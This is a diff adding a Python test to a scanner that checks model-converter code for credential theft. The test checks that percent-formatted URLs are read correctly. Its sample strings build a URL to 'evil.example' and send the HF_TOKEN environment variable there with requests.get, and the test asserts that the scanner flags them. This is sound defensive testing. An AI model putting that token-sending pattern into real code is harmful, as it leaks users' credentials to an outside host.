@@ -3940,6 +3940,62 @@ def test_a_constant_rewritten_into_a_url_refuses_it():
     ]
 
 
+def test_percent_formatting_is_read_whichever_way_it_is_written():
+    """The operator takes a mapping as well as a tuple, and only the tuple was
+    folded. "%(scheme)s://%(host)s/c" % {"scheme": "https", "host":
+    "evil.example"} is a whole URL where neither half is a destination on its
+    own, so the walk saw only the hub literal beside it.
+
+    An operand this cannot read now leaves a hole rather than erasing the
+    template, which is what the join and the f-string already did: "%s://%s" %
+    (scheme, host) spells its own scheme out of one, and refusing a scheme that
+    comes out of a hole catches both. The same hole keeps honest code readable,
+    since "/api/models/%s" % name appended to the hub URL was text the authority
+    check could not read either.
+    """
+    scan_converter_source = _load(
+        "converter_scan_percent_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    hub = 'HUB = "https://huggingface.co"\n'
+    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        hub + 'url = "%(s)s://%(h)s/c" % {"s": "https", "h": "evil.example"}\n'
+        + send,
+        hub + 'url = "%(s)s://%(h)s/c" % parts\n' + send,
+        hub + 'url = "%s://%s/c" % (scheme, host)\n' + send,
+    ):
+        assert [
+            f.check for f in scan_converter_source(
+                'import os\nimport requests\n' + body
+            )
+        ], body
+
+    # A mapping template that spells the hub itself is read as the hub, which
+    # is what makes folding it worth doing rather than refusing the shape: the
+    # key has to be skipped over rather than read as the conversion, or every
+    # mapping template stays a hole and an honest one is refused.
+    assert scan_converter_source(
+        'import os\nimport requests\n'
+        + 'url = "%(s)s://%(h)s/api" % {"s": "https", "h": "huggingface.co"}\n'
+        + send
+    ) == []
+    # A key the mapping does not supply raises rather than folds, and erasing
+    # the template there left the destination unnamed instead of unreadable.
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\nimport requests\n' + hub
+            + 'url = "%(s)s://%(h)s/c" % {"s": "https"}\n' + send
+        )
+    ]
+
+    # A path built the same way, appended to the hub, is what honest code does.
+    assert scan_converter_source(
+        'import os\nimport requests\n' + hub
+        + 'url = HUB + "/api/models/%s" % name\n' + send
+    ) == []
+
+
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
     """Only the env-harvest combination is narrowed. A credential stealer or a
     remote-code loader that happens to mention the hub is untouched.
